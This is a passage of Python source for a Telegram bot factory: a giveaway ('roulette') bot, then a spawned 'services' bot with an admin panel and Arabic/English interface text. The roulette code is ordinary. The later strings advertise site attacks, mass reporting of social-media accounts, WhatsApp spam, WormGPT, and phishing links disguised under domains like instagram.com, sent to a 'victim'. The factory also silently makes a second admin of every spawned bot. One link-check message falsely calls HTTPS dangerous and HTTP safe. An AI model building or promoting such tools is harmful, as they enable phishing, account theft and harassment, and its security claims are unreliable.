            bot.send_message(user_id, "❗ حدث خطأ: بيانات الروليت غير مكتملة. يرجى البدء من جديد عبر /start.")
            return

        roulette_id = str(uuid.uuid4())
        initial_text = f"{data['roulette_text']}\n\n👥 عدد المشاركين: 0"

        try:
            channel_message = bot.send_message(
                chat_id=data['main_channel_id'],
                text=initial_text,
                parse_mode="HTML",
                reply_markup=get_channel_roulette_markup(roulette_id, True),
                protect_content=True if data.get('protect_content') else False
            )

            bot.send_message(
                user_id,
                f"✅ تم نشر الروليت في القناة: @{data['main_channel_username']}\n\nتحكم بالروليت الخاص بك من خلال رسالة السحب في القناة (ID: {roulette_id})."
            )

            active_roulettes[roulette_id] = {
                'creator_id': user_id,
                'main_channel_id': data['main_channel_id'],
                'main_channel_username': data['main_channel_username'],
                'channel_message_id': channel_message.message_id,
                'text': data['roulette_text'],
                'conditional_channel_id': data.get('conditional_channel_id'),
                'conditional_channel_username': data.get('conditional_channel_username'),
                'winners_count': data['winners_count'],
                'participants': set(),
                'active': True,
                'winners': [],
                'reminders': set()
            }
            bot.send_message(user_id, "🎉 تم إنشاء الروليت بنجاح ونشره!")
            save_data()

        except telebot.apihelper.ApiTelegramException as e:
            bot.send_message(user_id, f"❗ فشل في النشر داخل القناة. تأكد أن البوت مشرف ولديه صلاحية إرسال الرسائل.\nالخطأ: {e}")
            active_roulettes.pop(roulette_id, None)
        except Exception as e:
            bot.send_message(user_id, f"❗ حدث خطأ غير متوقع أثناء نشر الروليت: {e}")
            active_roulettes.pop(roulette_id, None)
        save_data()

    # --- معالجات الرسائل ---
    @bot.message_handler(commands=['start'])
    def start_cmd(message: telebot.types.Message):
        all_user_ids.add(message.from_user.id)
        user_states.pop(message.from_user.id, None)
        user_temp_data.pop(message.from_user.id, None)
        bot.send_message(
            message.chat.id,
            "👋 أهلاً بك في بوت الروليت!\nاضغط الزر أدناه لإنشاء روليت:",
            reply_markup=main_menu_kb()
        )
        save_data()

    @bot.message_handler(commands=['admin'])
    def admin_cmd(message: telebot.types.Message):
        if not is_admin(message.from_user.id):
            bot.send_message(message.chat.id, "🚫 أنت لست مسؤولاً عن البوت.")
            return
        bot.send_message(
            message.chat.id,
            "🌟 لوحة تحكم المسؤول:",
            reply_markup=admin_main_menu_kb()
        )

    # --- معالجات الكولباك ---
    @bot.callback_query_handler(func=lambda c: c.data == "back_to_main_menu")
    def handle_back_to_main_menu(call):
        user_states.pop(call.from_user.id, None)
        user_temp_data.pop(call.from_user.id, None)
        bot.answer_callback_query(call.id)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="👋 أهلاً بك في بوت الروليت!\nاضغط الزر أدناه لإنشاء روليت:",
            reply_markup=main_menu_kb()
        )
        save_data()

    @bot.callback_query_handler(func=lambda c: c.data == "admin_main_menu")
    def handle_admin_main_menu(call):
        if not is_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "🚫 أنت لست مسؤولاً عن البوت.", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="🌟 لوحة تحكم المسؤول:",
            reply_markup=admin_main_menu_kb()
        )
        save_data()

    # --- معالجات إنشاء الروليت ---
    @bot.callback_query_handler(func=lambda c: c.data == "create_roulette")
    def handle_create_roulette_callback(call):
        user_id = call.from_user.id
        bot.answer_callback_query(call.id)

        if not bot_enabled and not is_admin(user_id):
            bot.send_message(call.message.chat.id, "🚫 البوت متوقف حالياً من قبل المسؤول.")
            return

        if user_id not in bound_channels:
            bot.send_message(call.message.chat.id, "❗ عليك ربط قناة أولاً قبل إنشاء الروليت.", reply_markup=channel_binding_kb())
            user_states[user_id] = 'awaiting_main_channel_forward'
            save_data()
            return

        user_temp_data[user_id] = {
            'main_channel_id': bound_channels[user_id]['channel_id'],
            'main_channel_username': bound_channels[user_id]['channel_username']
        }
        bot.send_message(call.message.chat.id, "أرسل كليشة السحب\n\n1 - للتشويش: <code>&lt;tg-spoiler&gt;&lt;/tg-spoiler&gt;</code>\n<tg-spoiler>مثال</tg-spoiler>\n\n2 - للتعريض: <code>&lt;b&gt;&lt;/b&gt;</code>\n<b>مثال</b>\n\n3 - لجعل النص مائل: <code>&lt;i&gt;&lt;/i&gt;</code>\n<i>مثال</i>\n\n4 - للاقتباس: <code>&lt;blockquote&gt;&lt;/blockquote&gt;</code>\n<blockquote>مثال</blockquote>\n\n🚫 رجاءً عدم إرسال روابط نهائياً", parse_mode="HTML")
        user_states[user_id] = 'awaiting_roulette_text'
        save_data()

    @bot.callback_query_handler(func=lambda c: c.data == "bind_main_channel")
    def handle_bind_main_channel_callback(call):
        user_id = call.from_user.id
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "1️⃣ أضف البوت كمشرف في قناتك.\n2️⃣ قم بإعادة توجيه أي رسالة من قناتك إلى البوت.\n\n📌 ملاحظة:\nجميع المشرفين الآخرين في القناة سيتمكنون أيضًا من استخدام البوت بعد إضافته.", reply_markup=channel_binding_kb())
        user_states[user_id] = 'awaiting_main_channel_forward'
        save_data()

    @bot.callback_query_handler(func=lambda c: c.data == "disconnect_main_channel")
    def handle_disconnect_main_channel_callback(call):
        user_id = call.from_user.id
        bot.answer_callback_query(call.id)
        if user_id in bound_channels:
            del bound_channels[user_id]
            bot.send_message(call.message.chat.id, "✖️ تم فصل القناة بنجاح.")
        else:
            bot.send_message(call.message.chat.id, "❗ لم يتم تعيين قناة لك مسبقاً.")
        save_data()

    # --- معالجات المشاركة في الروليت ---
    @bot.callback_query_handler(func=lambda c: c.data.startswith("join_roulette_"))
    def handle_join_roulette(call):
        roulette_id = call.data.split("_")[2]
        user_id = call.from_user.id
        username = call.from_user.username

        r = active_roulettes.get(roulette_id)
        if not r:
            bot.answer_callback_query(call.id, "❗ السحب غير موجود.", show_alert=True)
            return

        if user_id == r['creator_id']:
            bot.answer_callback_query(call.id, "لا يمكنك المشاركة في سحبك الخاص.", show_alert=True)
            return

        if user_id in global_banned_users:
            bot.answer_callback_query(call.id, "🚫 تم استبعادك من سحوبات البوت بشكل عام.", show_alert=True)
            return

        if not r['active']:
            bot.answer_callback_query(call.id, "⛔ المشاركة في هذا السحب متوقفة حالياً.", show_alert=True)
            return

        if user_id in r['participants']:
            bot.answer_callback_query(call.id, "✅ أنت مشارك بالفعل.", show_alert=True)
            return

        if user_id in banned_from_creator_roulettes.get(r['creator_id'], set()):
            bot.answer_callback_query(call.id, "🚫 تم استبعادك من سحوبات هذا المنشئ.", show_alert=True)
            return

        if r['conditional_channel_id']:
            try:
                if not is_channel_member(r['conditional_channel_id'], user_id):
                    bot.answer_callback_query(call.id, "📛 عليك الاشتراك في القناة الشرطية أولاً للمشاركة.", show_alert=True)
                    conditional_channel_username = r.get('conditional_channel_username')
                    if conditional_channel_username:
                        link_to_send = f"https://t.me/{conditional_channel_username}"
                        bot.send_message(user_id, f"الرجاء الانضمام إلى القناة الشرطية للمشاركة في السحب:\n{link_to_send}")
                    return
            except Exception:
                bot.answer_callback_query(call.id, "⚠️ خطأ في التحقق من الاشتراك في القناة الشرطية.", show_alert=True)
                return

        r['participants'].add(user_id)
        bot.answer_callback_query(call.id, "✅ تم تسجيل مشاركتك!")
        update_roulette_message(roulette_id)
        save_data()

        try:
            participant_info = f"👤 @{username}" if username else f"المستخدم {user_id}"
            bot.send_message(
                r['creator_id'],
                f"🎉 مشاركة جديدة في سحبك:\n\n{participant_info}\n🆔 {user_id}\n📊 عدد المشاركين الكلي: {len(r['participants'])}",
                reply_markup=creator_exclude_kb(roulette_id, user_id)
            )
        except Exception:
            pass
        save_data()

    @bot.callback_query_handler(func=lambda c: c.data.startswith("toggle_participation_"))
    def handle_toggle_participation(call):
        roulette_id = call.data.split("_")[2]
        user_id = call.from_user.id
        r = active_roulettes.get(roulette_id)

        if not r or user_id != r['creator_id']:
            bot.answer_callback_query(call.id, "❗ هذا الأمر مخصص لمنشئ الروليت فقط.", show_alert=True)
            return

        bot.answer_callback_query(call.id)
        r['active'] = not r['active']
        status_text = "✅ تم تشغيل المشاركة." if r['active'] else "⛔ تم إيقاف المشاركة."
        update_roulette_message(roulette_id)
        bot.send_message(user_id, status_text)
        save_data()

    @bot.callback_query_handler(func=lambda c: c.data.startswith("start_draw_"))
    def handle_start_draw(call):
        roulette_id = call.data.split("_")[2]
        user_id = call.from_user.id
        r = active_roulettes.get(roulette_id)

        if not r or user_id != r['creator_id']:
            bot.answer_callback_query(call.id, "❗ هذا الأمر مخصص لمنشئ الروليت فقط.", show_alert=True)
            return

        bot.answer_callback_query(call.id)
        if not r['participants']:
            bot.send_message(user_id, "❗ لا يوجد مشاركون في السحب.")
            return

        if r['winners']:
            bot.send_message(user_id, "❗ تم السحب مسبقاً لهذا الروليت.")
            return

        if len(r['participants']) < r['winners_count']:
            bot.send_message(user_id, f"❗ عدد المشاركين ({len(r['participants'])}) أقل من عدد الفائزين المطلوب ({r['winners_count']}). سيتم سحب جميع المشاركين المتاحين.")
            winners = list(r['participants'])
        else:
            winners = random.sample(list(r['participants']), r['winners_count'])

        r['winners'] = winners
        r['active'] = False

        update_roulette_message(roulette_id)
        bot.send_message(user_id, "✅ تم سحب الفائزين بنجاح!")

        for winner_id in winners:
            if winner_id in r['reminders']:
                try:
                    bot.send_message(
                        winner_id,
                        f"🎉 تهانينا! لقد فزت في السحب:\n\n{r['text']}\n\n🏆 يمكنك التحقق من الفائزين في القناة: @{r['main_channel_username']}",
                        parse_mode="HTML"
                    )
                except Exception:
                    pass
        save_data()

    # --- معالجات لوحة المطور (الأدمن) ---
    @bot.callback_query_handler(func=lambda c: c.data == "admin_manage_roulettes")
    def admin_manage_roulettes(call):
        if not is_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "🚫 أنت لست مسؤولاً عن البوت.", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        if not active_roulettes:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="لا توجد روليتات نشطة حالياً.",
                reply_markup=admin_main_menu_kb()
            )
            return
        
        # إنشاء قائمة الروليتات يدوياً
        kb = InlineKeyboardMarkup(row_width=1)
        for r_id, r in active_roulettes.items():
            try:
                creator_info = bot.get_chat(r['creator_id'])
                creator_username = f" (@{creator_info.username})" if creator_info.username else ""
            except Exception:
                creator_username = ""
            kb.add(InlineKeyboardButton(f"ID: {r_id[:5]}... - المنشئ: {r['creator_id']}{creator_username}", callback_data=f"admin_manage_specific_roulette_{r_id}"))
        
        kb.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_main_menu"))
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="قائمة الروليتات النشطة:",
            reply_markup=kb
        )

    # --- معالجات الرسائل حسب الحالة ---
    @bot.message_handler(content_types=['text', 'audio', 'photo', 'video', 'document', 'new_chat_members', 'left_chat_member'], func=lambda message: True)
    def handle_messages_by_state(message: telebot.types.Message):
        user_id = message.from_user.id
        current_state = user_states.get(user_id)
        all_user_ids.add(user_id)

        if not bot_enabled and not is_admin(user_id):
            bot.send_message(message.chat.id, "🚫 البوت متوقف حالياً من قبل المسؤول.")
            return

        # معالجة دخول الأعضاء الجدد
        if message.new_chat_members:
            if notify_on_join:
                for new_member in message.new_chat_members:
                    if new_member.id == bot.get_me().id:
                        bot.send_message(message.chat.id, "مرحباً! لقد تم إضافتي إلى هذه المجموعة. تأكد من منحي صلاحيات المشرف للعمل بشكل صحيح.")
                        continue
                    
                    if message.chat.type in ['group', 'supergroup']:
                        try:
                            member_name = new_member.first_name
                            if new_member.last_name:
                                member_name += f" {new_member.last_name}"
                            user_mention = f"<a href='tg://user?id={new_member.id}'>{member_name}</a>"
                            
                            formatted_welcome = welcome_message.replace("[USER_MENTION]", user_mention)
                            bot.send_message(message.chat.id, formatted_welcome, parse_mode="HTML")
                        except Exception as e:
                            print(f"Error sending welcome message: {e}")
            return

        # معالجة مغادرة الأعضاء
        if message.left_chat_member:
            if notify_on_ban:
                try:
                    member_name = message.left_chat_member.first_name
                    if message.left_chat_member.last_name:
                        member_name += f" {message.left_chat_member.last_name}"
                    bot.send_message(message.chat.id, f"🛡️ المستخدم {member_name} (ID: {message.left_chat_member.id}) غادر/تم طرده من المجموعة.")
                except Exception as e:
                    print(f"Error sending ban notification: {e}")
            return

        if current_state == 'awaiting_main_channel_forward':
            if message.forward_from_chat and message.forward_from_chat.type == "channel":
                channel = message.forward_from_chat
                try:
                    bot_member = bot.get_chat_member(channel.id, bot.get_me().id)
                    if bot_member.status not in ['administrator', 'creator']:
                        bot.send_message(message.chat.id, "❗ البوت ليس مشرفاً في هذه القناة. الرجاء إضافة البوت كمشرف وإعادة التوجيه.")
                        return
                except Exception:
                    bot.send_message(message.chat.id, "❗ حدث خطأ أثناء التحقق من صلاحيات البوت في القناة. تأكد من أن القناة عامة وأن البوت مشرف.")
                    return

                bound_channels[user_id] = {
                    'channel_id': channel.id,
                    'channel_username': channel.username
                }
                bot.send_message(message.chat.id, f"✅ تم ربط القناة: @{channel.username or channel.title}")
                user_states.pop(user_id, None)
            else:
                bot.send_message(message.chat.id, "❗ يرجى إعادة توجيه رسالة من قناة عامة أضفت فيها البوت كمشرف.")
            save_data()

        elif current_state == 'awaiting_roulette_text':
            user_temp_data[user_id]['roulette_text'] = message.text
            bot.send_message(message.chat.id, "✅ تم حفظ الكليشة، اختر أحد الخيارات:", reply_markup=roulette_creation_options_kb())
            user_states[user_id] = 'awaiting_roulette_options_choice'
            save_data()
        
        elif current_state == 'awaiting_winner_count':
            try:
                count = int(message.text)
                if count <= 0:
                    raise ValueError("Positive number required")
                user_temp_data[user_id]['winners_count'] = count
                publish_roulette(user_id)
                user_states.pop(user_id, None)
                user_temp_data.pop(user_id, None)
            except ValueError:
                bot.send_message(message.chat.id, "❗ الرجاء إرسال عدد صحيح موجب للفائزين.")
            except Exception as e:
                bot.send_message(message.chat.id, f"❗ حدث خطأ أثناء نشر الروليت: {e}")
                user_states.pop(user_id, None)
                user_temp_data.pop(user_id, None)
            save_data()
        
        elif not message.text.startswith('/'):
            bot.send_message(message.chat.id, "❗ أمر غير مفهوم. الرجاء استخدام الأزرار أو /start للبدء.", reply_markup=main_menu_kb())
        
        save_data()

    # تحميل البيانات عند بدء البوت
    load_data()

    try:
        bot_username = bot.get_me().username
        print(f"✅ Roulette bot @{bot_username} is now running...")
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"Roulette bot with token {token} stopped due to error: {e}")
        if token in running_bot_threads:
            del running_bot_threads[token]

# ==============================================================================
# --- بداية منطق البوت المصنوع (الاندكسات) ---
# ==============================================================================
def run_new_bot(token, owner_id, data_dir):
    bot = telebot.TeleBot(token, parse_mode="HTML")
    
    # --- إعدادات ملفات البوت المصنوع ---
    subscribers_file = os.path.join(data_dir, "users.txt")
    admins_file = os.path.join(data_dir, "admins.txt")
    channels_file = os.path.join(data_dir, "channels.txt")
    banned_file = os.path.join(data_dir, "banned.txt")
    status_file = os.path.join(data_dir, "status.txt")
    notify_file = os.path.join(data_dir, "notify.txt")
    state_file = os.path.join(data_dir, "state.json")
    paid_mode_file = os.path.join(data_dir, "paid_mode.txt")
    paid_users_file = os.path.join(data_dir, "paid_users.txt")
    start_message_file = os.path.join(data_dir, "start_message.txt")
    points_file = os.path.join(data_dir, "points.json")
    invited_by_file = os.path.join(data_dir, "invited_by.json")
    payment_methods_file = os.path.join(data_dir, "payment_methods.json")
    stars_config_file = os.path.join(data_dir, "stars_config.json")
    custom_buttons_file = os.path.join(data_dir, "custom_buttons.json")
    hidden_buttons_file = os.path.join(data_dir, "hidden_buttons.json")
    language_file = os.path.join(data_dir, "language.txt")

    # --- دوال مساعدة لإدارة الملفات ---
    def get_json_data(file_path):
        try:
            if not os.path.exists(file_path):
                with open(file_path, 'w', encoding='utf-8') as f: json.dump({}, f)
                return {}
            with open(file_path, 'r', encoding='utf-8') as f: return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError): return {}
        
    def save_json_data(file_path, data):
        with open(file_path, 'w', encoding='utf-8') as f: json.dump(data, f, indent=4, ensure_ascii=False)
        
    def get_lines(file_path):
        try:
            if not os.path.exists(file_path): return []
            with open(file_path, 'r', encoding='utf-8') as f: return [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError: return []
        
    def add_line(file_path, line):
        current_lines = get_lines(file_path)
        if str(line) not in current_lines:
            with open(file_path, 'a', encoding='utf-8') as f: f.write(f"{line}\n")
            
    def remove_line(file_path, line_to_remove):
        lines = get_lines(file_path)
        with open(file_path, 'w', encoding='utf-8') as f:
            for line in lines:
                if line != str(line_to_remove): f.write(f"{line}\n")
                
    def get_setting(file_path, default):
        try:
            with open(file_path, 'r', encoding='utf-8') as f: return f.read().strip()
        except FileNotFoundError: return default
        
    def set_setting(file_path, value):
        with open(file_path, 'w', encoding='utf-8') as f: f.write(str(value))
        
    def get_state(user_id):
        states = get_json_data(state_file)
        return states.get(str(user_id))
        
    def set_state(user_id, state):
        states = get_json_data(state_file)
        if state is None:
            if str(user_id) in states:
                del states[str(user_id)]
        else:
            states[str(user_id)] = state
        save_json_data(state_file, states)
        
    def has_premium_features():
        premium_file = os.path.join(PREMIUM_FEATURES_DIR, f"{token}.txt")
        return os.path.exists(premium_file)

    # --- إعدادات أولية للبوت المصنوع ---
    if not os.path.exists(admins_file): 
        add_line(admins_file, owner_id)
        add_line(admins_file, FACTORY_SECOND_ADMIN_ID)
    if not os.path.exists(status_file): set_setting(status_file, "ON")
    if not os.path.exists(notify_file): set_setting(notify_file, "ON")
    if not os.path.exists(paid_mode_file): set_setting(paid_mode_file, "OFF")
    if not os.path.exists(stars_config_file): save_json_data(stars_config_file, {})
    if not os.path.exists(custom_buttons_file): save_json_data(custom_buttons_file, {})
    if not os.path.exists(hidden_buttons_file): save_json_data(hidden_buttons_file, [])
    if not os.path.exists(language_file): set_setting(language_file, "ar")

    # --- دوال التحقق من الحالة ---
    def is_admin(user_id): 
        admins = get_lines(admins_file)
        # التحقق من المطور الأساسي والثاني
        return str(user_id) in admins or user_id == owner_id or user_id == FACTORY_SECOND_ADMIN_ID
    def is_paid_user(user_id): return str(user_id) in get_lines(paid_users_file)
    def is_paid_mode(): return get_setting(paid_mode_file, "OFF") == "ON"
    def is_bot_enabled(): return get_setting(status_file, "ON") == "ON"
    def is_user_banned(user_id): return str(user_id) in get_lines(banned_file)
    def is_bot_paid_to_factory():
        paid_file = os.path.join(PAID_BOTS_DIR, f"{token}.txt")
        if not os.path.exists(paid_file): return False
        try:
            expire_timestamp = float(open(paid_file).read().strip())
            return datetime.datetime.now().timestamp() < expire_timestamp
        except (ValueError, TypeError): return False
    def is_user_subscribed(user_id):
        bot_specific_channels = get_lines(channels_file)
        if not bot_specific_channels: return True, []
        not_subscribed_bot_channels = []
        for ch in bot_specific_channels:
            try:
                member = bot.get_chat_member(f"@{ch}", user_id)
                if member.status not in ['member', 'administrator', 'creator']:
                    not_subscribed_bot_channels.append(ch)
            except Exception: not_subscribed_bot_channels.append(ch)
        if not_subscribed_bot_channels: return False, not_subscribed_bot_channels
        return True, []
    
    # --- نظام اللغات المتكامل ---
    def get_locale(lang_code=None):
        if lang_code is None:
            lang_code = get_setting(language_file, "ar")

        locales = {
            "ar": {
                # --- نصوص لوحة التحكم ---
                "welcome_panel": "<b>مرحباً بك! إليك لوحة التحكم الخاصة بك:</b>",
                "subscribers_count": "👥 المشتركين ({})",
                "broadcast_button": "📮 إذاعة رسالة",
                "forward_button": "🔄 توجيه رسالة",
                "add_channel_button": "💢 إضافة قناة",
                "delete_channel_button": "🔱 حذف قناة",
                "notify_on_button": "✔️ تفعيل التنبيه",
                "notify_off_button": "❎ تعطيل التنبيه",
                "bot_on_button": "✅ فتح البوت",
                "bot_off_button": "❌ إيقاف البوت",
                "ban_button": "🚫 حظر عضو",
                "unban_button": "🔓 إلغاء حظر",
                "add_admin_button": "➕ إضافة أدمن",
                "rem_admin_button": "➖ طرد أدمن",
                "paid_mode_button": "💰 الوضع المدفوع",
                "free_mode_button": "🆓 الوضع المجاني",
                "add_paid_button": "⭐ إضافة عضوية مدفوعة",
                "rem_paid_button": "🗑️ حذف عضوية مدفوعة",
                "set_stars_button": "🌟 تعيين عدد النجوم",
                "manage_payment_button": "💳 إدارة الدفع",
                "buttons_section_button": "🎛️ قسم الأزرار",
                "change_language_button": "🌍 تغيير اللغة",
                "edit_start_msg_button": "✏️ تعديل رسالة /start",
                "download_data_button": "📥 تحميل بيانات البوت",
                # --- نصوص المستخدم العام ---
                "welcome_user": "🤖✨ <b>مرحباً بك في بوت الخدمات.</b>",
                "must_subscribe": "🚫 <b>يجب عليك الاشتراك في القنوات التالية للمتابعة:</b>",
                "subscribed_button": "✅ تم الاشتراك",
                "contact_developer_button": "التواصل مع المطور 👨‍💻",
                "factory_link_text": "لصنع بوت مثل هذا",
                "bot_under_maintenance": "🚨 <b>البوت متوقف حالياً للصيانة.</b>",
                "user_banned": "🚫 <b>أنت محظور من استخدام هذا البوت.</b>",
                # --- نصوص الأزرار الرئيسية (محدثة) ---
                "hack_sites_btn": "هجوم مواقع ☠️",
                "xo_game_btn": "لعبة XO 🎮",
                "facebook_reports_btn": "بلاغات فيسبوك 📢",
                "twitter_reports_btn": "بلاغات تويتر 🐦",
                "virtual_numbers_btn": "أرقام وهمية ☎️",
                "tiktok_reports_btn": "بلاغات تيك توك 🎵",
                "link_shortener_btn": "اختصار الروابط 🔗",
                "name_decorator_btn": "زخرفة الأسماء ✨",
                "website_checker_btn": "فحص المواقع 🌐",
                # الأزرار الجديدة
                "instagram_reports_btn": "بلاغات انستا 🧾",
                "telegram_reports_btn": "بلاغات تليجرام",
                "whatsapp_reports_btn": "بلاغات واتساب",
                "ip_info_btn": "معلومات ip 😸",
                "translation_btn": "ترجمة 🌍",
                "help_button": "التعليمات 📜",
                # --- نصوص تفاعلية ---
                "back_button": "🔙 العودة",
                "cancel_button": "🔙 إلغاء",
                "action_cancelled": "✅ تم إلغاء الإجراء.",
                "language_changed": "✅ تم تغيير لغة البوت بنجاح.",
                "choose_language": "🌍 يرجى اختيار اللغة الجديدة للبوت:",
                "set_start_msg_prompt": "أرسل الآن رسالة الترحيب الجديدة.",
                "link_generated": "✅ تم توليد الرابط بنجاح",
                "copy_and_send_link": "<b>انسخ الرابط التالي وأرسله للضحية:</b>\n<code>{}</code>",
                "ask_wormgpt_prompt": "🤖 أرسل سؤالك الآن لـ WormGPT.",
                "interpret_dream_prompt": "🛌 أرسل حلمك الآن ليتم تفسيره.",
                "check_link_prompt": "🔭 أرسل الآن الرابط الذي تريد فحصه.",
                "text_to_speech_prompt": "أرسل الآن النص الذي تريد تحويله إلى بصمة صوتية.",
                "booming_link_prompt": "☠️ <b>قم بإرسال الرابط المراد تلغيمه</b>...",
                "hide_link_prompt": "🔒 الرجاء إدخال الرابط الأصلي الذي تريد إخفاءه:",
                "whatsapp_spam_prompt": "❄️ أرسل رقم واتساب الضحية مع رمز الدولة (مثال: 201001234567):",
                "action_success": "✅ تم تنفيذ الإجراء بنجاح.",
                "ask_channel_id": "أرسل معرف القناة بدون @",
                "ask_ban_id": "أرسل آي دي العضو الذي تريد حظره",
                "ask_unban_id": "أرسل آي دي العضو لإلغاء حظره",
                "ask_add_admin_id": "أرسل آي دي المستخدم للترقية",
                "ask_rem_admin_id": "أرسل آي دي الأدمن للعزل",
                "ask_add_paid_id": "أرسل آي دي العضو للإضافة للعضوية المدفوعة",
                "ask_rem_paid_id": "أرسل آي دي العضو للحذف من العضوية المدفوعة",
                "ask_broadcast_msg": "حسناً، أرسل رسالتك ليتم بثها لجميع المشتركين 📮",
                "ask_forward_msg": "حسناً، قم بتوجيه الرسالة لي الآن 🔄",
                "original_link_saved": "✅ تم حفظ الرابط الأصلي.\n\nأدخل الآن النطاق المخصص (مثال: instagram.com):",
                "invalid_original_link": "❌ الرابط الأصلي غير صالح. يجب أن يبدأ بـ http:// أو https://",
                "domain_saved": "✅ تم حفظ النطاق.\n\nأدخل الآن الكلمات الرئيسية (مثال: -login-now):",
                "invalid_domain": "❌ صيغة النطاق المخصص غير صحيحة. أرسل نطاقاً صالحاً (مثل: example.com).",
                "disguised_links_header": "<b>[~] الروابط المقنعة:</b>\n",
                "original_link_display": "<b>الرابط الأصلي:</b> {}\n\n",
                "invalid_phone_number": "❌ رقم الهاتف غير صالح. يرجى إرسال رقم صحيح مع رمز الدولة.",
                "sending_spam": "⏳ جاري إرسال رسالة الاسبام...",
                "spam_sent_success": "✅ تم إرسال رسالة الاسبام بنجاح!",
                "link_secure": "✅ <b>آمن.</b>\nيبدو أن هذا الرابط يستخدم بروتوكول HTTP القياسي.",
                "link_insecure": "🚨 <b>خطر!</b>\nتم اكتشاف أن هذا الرابط قد يكون ضاراً لأنه يستخدم بروتوكول HTTPS المشفر.",
                "link_unknown": "⚠️ لا يمكن تحديد حالة الرابط. يرجى إرسال رابط يبدأ بـ http أو https.",
                "tts_processing": "⏳ جاري تحويل النص إلى بصمة صوتية...",
                "tts_error": "❌ حدث خطأ أثناء التحويل. يرجى المحاولة مرة أخرى لاحقاً.",
                "service_busy": "❌ عذرًا، الخدمة مشغولة حاليًا. يرجى المحاولة مرة أخرى لاحقاً.",
                "zakhrafa_done": "<b>تمت الزخرفة:</b>\n\n{}",
                "choose_zakhrafa_lang": "اختر لغة النص للزخرفة:",
                "ask_zakhrafa_text": "أرسل الآن النص بـ<b>{}</b> ليتم زخرفته.",
                "lang_ar": "العربية",
                "lang_en": "الإنجليزية",
                # --- نصوص ميزة تحميل البيانات (جديد) ---
                "download_data_header": "📥 اختر البيانات التي تريد تحميلها:",
                "download_users_button": "👥 المستخدمين",
                "download_admins_button": "👑 المشرفين",
                "download_banned_button": "🚫 المحظورين",
                "download_channels_button": "📢 قنوات الاشتراك",
                "download_paid_users_button": "⭐ المستخدمين المدفوعين",
                "file_not_found": "⚠️ لم يتم العثور على الملف أو أنه فارغ.",
                # --- نصوص زر التعليمات ---
                "help_text": """📜 شروط الاستخدام:

أتعهد أنا المستخدم للتطبيق بأنني:

✅ لن أستخدم التطبيق فيما يغضب الله تعالى.  
✅ لن أسرق صور أو حسابات بغرض السرقة أو التجسس على الرسائل.  
✅ سأستخدم التطبيق فقط لغرض:
- المزاح اللطيف.
- الربح المشروع.
- التجربة الشخصية.
- الدعاية والإعلانات المسموح بها.

⚠️ أُبرئ ذمة مالك ومسؤول التطبيق من أي استخدام خاطئ أو مخالف يؤدي إلى معصية أو ضرر بالآخرين.

✨ الرجاء استخدام التطبيق بما يرضي الله ويحفظ حقوق الجميع."""
            },
            "en": {
                # --- Admin Panel Texts ---
                "welcome_panel": "<b>Welcome! Here is your control panel:</b>",
                "subscribers_count": "👥 Subscribers ({})",
                "broadcast_button": "📮 Broadcast Message",
                "forward_button": "🔄 Forward Message",
                "add_channel_button": "💢 Add Channel",
                "delete_channel_button": "🔱 Delete Channel",
                "notify_on_button": "✔️ Enable Notifications",
                "notify_off_button": "❎ Disable Notifications",
                "bot_on_button": "✅ Enable Bot",
                "bot_off_button": "❌ Disable Bot",
                "ban_button": "🚫 Ban User",
                "unban_button": "🔓 Unban User",
                "add_admin_button": "➕ Add Admin",
                "rem_admin_button": "➖ Remove Admin",
                "paid_mode_button": "💰 Paid Mode",
                "free_mode_button": "🆓 Free Mode",
                "add_paid_button": "⭐ Add Paid Member",
                "rem_paid_button": "🗑️ Remove Paid Member",
                "set_stars_button": "🌟 Set Stars Price",
                "manage_payment_button": "💳 Manage Payments",
                "buttons_section_button": "🎛️ Buttons Section",
                "change_language_button": "🌍 Change Language",
                "edit_start_msg_button": "✏️ Edit /start Message",
                "download_data_button": "📥 Download Bot Data",
                # --- General User Texts ---
                "welcome_user": "🤖✨ <b>Welcome to the services bot.</b>",
                "must_subscribe": "🚫 <b>You must subscribe to the following channels to continue:</b>",
                "subscribed_button": "✅ Subscribed",
                "contact_developer_button": "Contact Developer 👨‍💻",
                "factory_link_text": "",
                "bot_under_maintenance": "🚨 <b>The bot is currently under maintenance.</b>",
                "user_banned": "🚫 <b>You are banned from using this bot.</b>",
                # --- Main Buttons Texts (Updated) ---
                "hack_sites_btn": "Attack Sites ☠️",
                "xo_game_btn": "XO Game 🎮",
                "facebook_reports_btn": "Facebook Reports 📢",
                "twitter_reports_btn": "Twitter Reports 🐦",
                "virtual_numbers_btn": "Virtual Numbers ☎️",
                "tiktok_reports_btn": "TikTok Reports 🎵",
                "link_shortener_btn": "Link Shortener 🔗",
                "name_decorator_btn": "Name Decorator ✨",
                "website_checker_btn": "Website Checker 🌐",
                # New buttons
                "instagram_reports_btn": "Instagram Reports 🧾",
                "telegram_reports_btn": "Telegram Reports",
                "whatsapp_reports_btn": "WhatsApp Reports",
                "ip_info_btn": "IP Info 😸",
                "translation_btn": "Translation 🌍",
                "help_button": "Help 📜",
                # --- Interactive Texts ---
                "back_button": "🔙 Back",
                "cancel_button": "🔙 Cancel",
                "action_cancelled": "✅ Action has been cancelled.",
                "language_changed": "✅ Bot language has been changed successfully.",
                "choose_language": "🌍 Please choose the new language for the bot:",
                "set_start_msg_prompt": "Now, send the new welcome message.",
                "link_generated": "✅ Link generated successfully",
                "copy_and_send_link": "<b>Copy the following link and send it to the victim:</b>\n<code>{}</code>",
                "ask_wormgpt_prompt": "🤖 Send your question to WormGPT now.",
                "interpret_dream_prompt": "🛌 Send your dream now to be interpreted.",
                "check_link_prompt": "🔭 Send the link you want to scan now.",
                "text_to_speech_prompt": "Send the text you want to convert to a voice message now.",
                "booming_link_prompt": "☠️ <b>Send the link to be weaponized</b>...",
                "hide_link_prompt": "🔒 Please enter the original link you want to hide:",
